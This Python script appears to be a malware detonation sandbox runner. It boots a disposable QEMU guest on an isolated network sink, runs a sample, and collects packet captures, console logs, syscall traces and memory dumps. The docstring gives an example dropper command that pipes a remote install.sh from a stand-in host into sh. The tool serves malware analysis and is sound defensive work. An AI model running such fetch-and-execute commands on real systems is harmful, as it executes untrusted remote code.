#!/usr/bin/env python3
"""Detonate one sample in a disposable guest and collect what it did.

    sudo sbx-run --target mips --sample example/b/mips [--args ID]
                 [--duration 300] [--cmd 'shell command run in the guest']

--sample is a path under /srv/sandbox/serve. The guest downloads it from the
sink (http://10.200.0.1/_sbx/<sample>) to /tmp/.b, makes it executable and
runs it with --args. --cmd replaces that with any guest shell command, e.g.
"wget -qO- http://198.51.100.7/install.sh | sh" to replay a dropper chain
against rules.json.

Per run, in /srv/sandbox/runs/<run-id>/:
  console.log    full serial console transcript (boot, sample stdout, SBXMON)
  capture*.pcap  everything on sbx0 (host side of the bridge), rotated
  sink.jsonl     sink events (DNS queries, TCP/HTTP/TLS sessions, UDP
                 summaries) from this guest's address during the run
  dhcp.log       dnsmasq DHCP lines for this guest
  run.json       parameters, guest MAC/IP, timings, sample SHA-256

Isolation: the guest's tap is an isolated port on sbx0 (sink-only). QEMU runs
as user sbx in a transient systemd unit with /etc/sbx/inaccessible hidden,
memory and runtime limits, and the rootfs attached with snapshot=on.
"""
import argparse
import hashlib
import json
import os
import random
import re
import socket
import subprocess
import sys
import time

SBX = "/opt/sbx"
SERVE = "/srv/sandbox/serve"
IMAGES = "/srv/sandbox/images"
RUNS = "/srv/sandbox/runs"
# per-run scratch shared with QEMU (sockets, trace, memory dumps): on disk,
# because a dump is as large as guest RAM and /run is a small tmpfs
SCRATCH = "/srv/sandbox/tmp"
SINK_EVENTS = "/var/lib/sbx/sink/events.jsonl"
LEASES = "/run/sbx-dnsmasq/leases"
PROMPT = re.compile(rb"root@[^:]*:[^#]*# $")


def sh(*a, check=True, **kw):
    return subprocess.run(a, check=check, **kw)


class Console:
    def __init__(self, path, log):
        self.log = open(log, "ab", buffering=0)
        for _ in range(100):
            try:
                self.s = socket.socket(socket.AF_UNIX)
                self.s.connect(path)
                break
            except OSError:
                time.sleep(0.2)
        else:
            raise SystemExit("console socket never appeared")
        self.buf = b""

    def pump(self, secs):
        end = time.time() + secs
        while time.time() < end:
            self.s.settimeout(max(0.05, end - time.time()))
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                break
            if not d:
                raise EOFError("guest console closed")
            self.log.write(d)
            self.buf = (self.buf + d)[-65536:]

    def wait(self, pattern, timeout):
        end = time.time() + timeout
        while time.time() < end:
            if re.search(pattern, self.buf):
                return True
            self.pump(min(1.0, end - time.time()))
        return False

    def send(self, line):
        self.buf = b""
        self.s.sendall(line.encode() + b"\n")

    def run(self, cmd, timeout=30):
        self.send(cmd)
        return self.wait(PROMPT, timeout)


def inaccessible():
    """Paths hidden from QEMU: the sandbox's own data plus /etc/sbx/inaccessible."""
    paths = ["/srv/sandbox/serve", "/srv/sandbox/runs"]
    try:
        for l in open("/etc/sbx/inaccessible"):
            l = l.split("#")[0].strip()
            if l:
                paths.append(l)
    except OSError:
        pass
    return paths


def hmp(path, cmd, timeout=300):
    """Run one QEMU human-monitor command over its unix socket; return its output."""
    s = socket.socket(socket.AF_UNIX)
    s.settimeout(timeout)
    s.connect(path)
    buf = b""
    while not buf.endswith(b"(qemu) "):
        buf += s.recv(65536)
    s.sendall(cmd.encode() + b"\n")
    buf = b""
    while buf.count(b"(qemu) ") < 1:
        d = s.recv(65536)
        if not d:
            break
        buf += d
    s.close()
    return re.sub(rb"\x1b\[[0-9;]*[A-Za-z]", b"", buf).decode("latin-1", "replace")


def memdump(rtmp, t, mem_mb, label):
    """Guest memory to {rtmp}/mem-<label>.*: an ELF core where QEMU supports it
    for the target, otherwise a raw image of guest RAM (pmemsave)."""
    mon = f"{rtmp}/monitor.sock"
    elf = f"{rtmp}/mem-{label}.elf"
    st = os.statvfs(rtmp)
    need = (int(mem_mb) << 20) * 2 + (1 << 30)   # dump + its .gz + headroom
    if st.f_bavail * st.f_frsize < need:
        return {"label": label, "error": f"skipped: less than {need >> 20} MB free in {rtmp}"}
    # paths are quoted: HMP parses unquoted arguments as expressions, and the
    # '/' in a path reads as division
    out = hmp(mon, f'dump-guest-memory "{elf}"')
    if os.path.exists(elf) and os.path.getsize(elf) > 0:
        return {"label": label, "file": os.path.basename(elf), "format": "elf"}
    raw = f"{rtmp}/mem-{label}.raw"
    size = int(mem_mb) << 20
    out2 = hmp(mon, f'pmemsave {t.get("ram_base", "0x0")} {size} "{raw}"')
    if os.path.exists(raw) and os.path.getsize(raw) > 0:
        return {"label": label, "file": os.path.basename(raw), "format": "raw",
                "phys_base": t.get("ram_base", "0x0"), "elf_error": out.strip()[-200:]}
    return {"label": label, "error": (out + out2).strip()[-300:]}


def wait_status(path, prefixes, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            for l in open(path):
                if l.startswith(prefixes):
                    return l.strip()
        except OSError:
            pass
        time.sleep(0.5)
    return None


def lease_ip(mac, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            for l in open(LEASES):
                f = l.split()
                if len(f) >= 3 and f[1].lower() == mac:
                    return f[2]
        except OSError:
            pass
        time.sleep(1)
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--sample")
    ap.add_argument("--args", default="")
    ap.add_argument("--cmd")
    ap.add_argument("--duration", type=int, default=300)
    ap.add_argument("--mem", default="256")
    ap.add_argument("--no-monitor", action="store_true",
                    help="do not start the guest-side SBXMON process monitor")
    ap.add_argument("--post", default="dmesg | tail -60; cat /proc/net/tcp /proc/net/udp; "
                    "ls -la /tmp /dev/shm; cat /dev/shm/.comm",
                    help="guest commands run at the end if the console shell survived "
                         "(avoid ps/top/netstat/ss/lsof: some samples kill them)")
    ap.add_argument("--no-trace", action="store_true",
                    help="do not attach the out-of-guest syscall tracer (sbx-trace.py)")
    ap.add_argument("--trace-open", action="store_true",
                    help="also trace open/openat (very noisy; slows the guest)")
    ap.add_argument("--memdump", default="end",
                    help="when to dump guest memory: comma-separated seconds after "
                         "detonation and/or 'end' (default: end); 'none' to disable")
    a = ap.parse_args()
    dumps = [] if a.memdump == "none" else [x.strip() for x in a.memdump.split(",") if x.strip()]
    if os.geteuid() != 0:
        sys.exit("run as root (needs tap + capture)")
    if not a.sample and not a.cmd:
        sys.exit("need --sample or --cmd")
    if sh("systemctl", "is-active", "--quiet", "sbx-sink.service", check=False).returncode:
        sys.exit("sbx-sink.service is not running")

    cfg = json.load(open(f"{SBX}/guests/targets.json"))
    t = cfg["targets"].get(a.target) or sys.exit(f"unknown target {a.target}")
    img = f"{IMAGES}/{a.target}"
    if not os.path.exists(f"{img}/rootfs.ext4"):
        sys.exit(f"no image for {a.target}; run sbx-images.py {a.target}")

    sample_sha = None
    if a.sample:
        sp = os.path.realpath(os.path.join(SERVE, a.sample))
        if not sp.startswith(SERVE + "/") or not os.path.isfile(sp):
            sys.exit(f"{a.sample} not found under {SERVE}")
        sample_sha = hashlib.sha256(open(sp, "rb").read()).hexdigest()

    stamp = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    tag = re.sub(r"[^A-Za-z0-9_.-]", "_", (a.sample or "cmd").replace("/", "_"))[:40]
    run_id = f"{stamp}-{a.target}-{tag}"
    rdir = f"{RUNS}/{run_id}"
    rtmp = f"{SCRATCH}/{run_id}"
    os.makedirs(rdir)
    os.makedirs(rtmp)
    sh("chown", "sbx:sbx", rtmp)
    n = random.randrange(0x1000, 0xffff)
    tap = f"sbxtap{n:x}"
    mac = "52:54:00:5b:%02x:%02x" % (n >> 8, n & 0xff)
    unit = f"sbx-vm-{n:x}"
    meta = {"run_id": run_id, "target": a.target, "sample": a.sample,
            "sample_sha256": sample_sha, "args": a.args, "cmd": a.cmd,
            "duration": a.duration, "mac": mac, "tap": tap, "unit": unit,
            "image": json.load(open(f"{img}/manifest.json"))}

    trace = t.get("trace") and not a.no_trace
    gdb_port = 20000 + n % 20000
    cap = gdbp = None
    try:
        sh("ip", "tuntap", "add", "dev", tap, "mode", "tap", "user", "sbx")
        sh("sysctl", "-q", "-w", f"net.ipv6.conf.{tap}.disable_ipv6=1")
        sh("ip", "link", "set", tap, "master", "sbx0", "up")
        sh("bridge", "link", "set", "dev", tap, "isolated", "on")
        # -Z root: tcpdump otherwise drops to user tcpdump, which cannot write
        # into the root-owned run directory; files are capture.pcap00, 01, ...
        cap = subprocess.Popen(["tcpdump", "-Z", "root", "-i", "sbx0", "-n", "-U", "-s", "0",
                                "-C", "100", "-W", "20", "-w", f"{rdir}/capture.pcap",
                                f"ether host {mac}"],
                               stderr=open(f"{rdir}/tcpdump.log", "w"))
        meta["start"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

        subst = {"kernel": f"{img}/kernel", "rootfs": f"{img}/rootfs.ext4",
                 "tap": tap, "mac": mac, "mem": a.mem}
        argv = [x.format(**subst) for x in t["qemu"]]
        argv += ["-display", "none", "-no-reboot",
                 "-chardev", f"socket,id=s0,path={rtmp}/console.sock,server=on,wait=off",
                 "-serial", "chardev:s0",
                 "-monitor", f"unix:{rtmp}/monitor.sock,server=on,wait=off"]
        if trace:
            argv += ["-gdb", f"tcp:127.0.0.1:{gdb_port}"]
        props = ["User=sbx", "Group=sbx", "NoNewPrivileges=yes",
                 "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                 f"ReadWritePaths={rtmp}", f"ReadOnlyPaths={img}",
                 "InaccessiblePaths=" + " ".join("-" + p for p in inaccessible()),
                 "DevicePolicy=closed", "DeviceAllow=/dev/net/tun rw",
                 f"RuntimeMaxSec={a.duration + 600}",
                 # guest RAM plus QEMU's own overhead
                 f"MemoryMax={int(a.mem) + 512}M", "TasksMax=64"]
        if t.get("kvm"):
            props += ["DeviceAllow=/dev/kvm rw", "SupplementaryGroups=kvm"]
        sh("systemd-run", "--quiet", "--collect", f"--unit={unit}",
           *[f"--property={p}" for p in props], *argv)

        con = Console(f"{rtmp}/console.sock", f"{rdir}/console.log")
        if not con.wait(rb"Please press Enter|procd: - init complete -", 300):
            raise SystemExit("guest did not finish booting")
        # kernel messages keep arriving after the first prompt on slow
        # (emulated) guests; press Enter until a prompt is the last thing seen
        deadline = time.time() + 180
        while True:
            con.send("")
            if con.wait(PROMPT, 5):
                break
            if time.time() > deadline:
                raise SystemExit("no shell prompt on the console")
        con.run("dmesg -n 1")
        ip = lease_ip(mac, 120)
        meta["guest_ip"] = ip
        if not ip:
            raise SystemExit("guest got no DHCP lease from the sink")
        meta["boot_done"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

        if trace:
            gdbp = start_tracer(con, t, img, rtmp, gdb_port, a.trace_open, meta)

        if not a.no_monitor:
            con.run("/usr/libexec/sbx/sh /usr/libexec/sbx/mon.sh </dev/null >/dev/console 2>&1 &")
        if a.cmd:
            con.send(a.cmd)
        else:
            con.run(f"cd /tmp && wget -q -O .b http://10.200.0.1/_sbx/{a.sample} && chmod 777 .b", 60)
            con.send(f"./.b {a.args}".rstrip())
        meta["detonated"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        t0 = time.time()
        end = t0 + a.duration
        timed = sorted(int(x) for x in dumps if x.isdigit())
        meta["memdumps"] = []
        while time.time() < end:
            if timed and time.time() - t0 >= timed[0]:
                meta["memdumps"].append(memdump(rtmp, t, a.mem, f"t{timed.pop(0)}"))
            try:
                con.pump(min(1 if timed else 5, end - time.time()))
            except EOFError:
                meta["guest_exited_early"] = True
                break
        if "end" in dumps and not meta.get("guest_exited_early"):
            meta["memdumps"].append(memdump(rtmp, t, a.mem, "end"))
        if not meta.get("guest_exited_early") and a.post:
            # stop the monitor (its output never lets a prompt be the last
            # thing on the console), then run the post commands. The markers
            # are computed by the shell, so the echoed command line cannot
            # match them. The sample may have killed the console shell: no
            # marker is recorded, not an error.
            con.send("read p </var/run/sbxmon.pid; kill $p; "
                     "echo SBXPOST-$((1))BEGIN; " + a.post + "; echo SBXPOST-$((1))END")
            meta["post_ran"] = con.wait(rb"SBXPOST-1END\r?\n", 90)
    finally:
        meta["end"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        sh("systemctl", "stop", unit, check=False, stderr=subprocess.DEVNULL)
        if cap:
            cap.terminate()
            cap.wait(10)
        sh("ip", "link", "del", tap, check=False, stderr=subprocess.DEVNULL)
        if gdbp:
            try:
                gdbp.wait(15)   # exits when QEMU closes the gdb connection
            except subprocess.TimeoutExpired:
                gdbp.kill()
        for fn in ("trace.jsonl", "trace.status", "gdb.log"):
            if os.path.exists(f"{rtmp}/{fn}"):
                sh("cp", f"{rtmp}/{fn}", rdir, check=False)
        for d in meta.get("memdumps", []):
            if d.get("file") and os.path.exists(f"{rtmp}/{d['file']}"):
                sh("gzip", "-1", f"{rtmp}/{d['file']}", check=False)
                sh("mv", f"{rtmp}/{d['file']}.gz", rdir, check=False)
                d["file"] += ".gz"
        collect(meta, rdir)
        with open(f"{rdir}/run.json", "w") as f:
            json.dump(meta, f, indent=1)
        sh("rm", "-rf", rtmp, check=False)
        print(rdir)


def start_tracer(con, t, img, rtmp, port, trace_open, meta):
    """Attach sbx-trace.py through QEMU's gdb stub and calibrate it.

    The console shell's PID is the calibration anchor: the tracer waits for
    that shell to call kill(own pid, 0). Failure is recorded, not fatal: the
    run continues untraced."""
    con.send("echo SBXPID=$((0+$$))")
    if not con.wait(rb"SBXPID=(\d+)\r?\n", 20):
        meta["trace"] = {"error": "no shell pid"}
        return None
    shell_pid = int(re.search(rb"SBXPID=(\d+)\r?\n", con.buf).group(1))
    con.wait(PROMPT, 10)
    cfg = {"port": port, "kernel": f"{img}/kernel", "endian": t.get("endian", "little"),
           "shell_pid": shell_pid, "trace_open": trace_open,
           "out": f"{rtmp}/trace.jsonl", "status": f"{rtmp}/trace.status"}
    with open(f"{rtmp}/trace.json", "w") as f:
        json.dump(cfg, f)
    for fn in ("trace.jsonl", "trace.status"):
        open(f"{rtmp}/{fn}", "a").close()
        sh("chown", "sbx:sbx", f"{rtmp}/{fn}")
    gdbp = subprocess.Popen(
        ["runuser", "-u", "sbx", "--", "gdb-multiarch", "-nx", "-batch",
         "-ex", f"python SBX_CFG='{rtmp}/trace.json'", "-x", f"{SBX}/run/sbx-trace.py"],
        stdin=subprocess.DEVNULL, stdout=open(f"{rtmp}/gdb.log", "w"), stderr=subprocess.STDOUT)
    st = wait_status(f"{rtmp}/trace.status", ("READY", "FAIL"), 120)
    if not st or st.startswith("FAIL"):
        meta["trace"] = {"error": st or "tracer not ready"}
        return gdbp
    con.run("kill -0 $$")
    st = wait_status(f"{rtmp}/trace.status", ("TRACING", "FAIL"), 60)
    meta["trace"] = {"status": st or "calibration timed out"}
    return gdbp


def collect(meta, rdir):
    ip, start, end = meta.get("guest_ip"), meta.get("start"), meta.get("end")
    if ip and os.path.exists(SINK_EVENTS):
        with open(SINK_EVENTS) as src, open(f"{rdir}/sink.jsonl", "w") as dst:
            for l in src:
                try:
                    ev = json.loads(l)
                except ValueError:
                    continue
                if start <= ev.get("ts", "") <= end and str(ev.get("src", "")).split(":")[0] == ip:
                    dst.write(l)
    if ip and start:
        since = start.replace("T", " ").rstrip("Z") + " UTC"
        r = subprocess.run(["journalctl", "-u", "sbx-dnsmasq", "--since", since,
                            "--utc", "-o", "short-iso", "--no-pager"], capture_output=True, text=True)
        with open(f"{rdir}/dhcp.log", "w") as f:
            f.writelines(l + "\n" for l in r.stdout.splitlines() if ip in l or meta["mac"] in l)


if __name__ == "__main__":
    main()
